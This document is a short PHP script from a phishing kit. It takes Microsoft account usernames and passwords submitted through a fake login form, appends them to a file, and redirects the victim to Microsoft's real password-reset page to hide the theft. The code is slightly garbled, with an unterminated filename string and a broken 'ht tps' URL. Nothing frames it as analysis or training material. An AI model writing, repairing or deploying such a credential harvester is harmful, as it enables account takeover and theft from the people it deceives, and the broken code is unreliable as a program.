<?php

file_put_contents("password_get_info, "Microsoft Username: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: ht tps://account.live.com/ResetPassword.aspx');
exit();
?>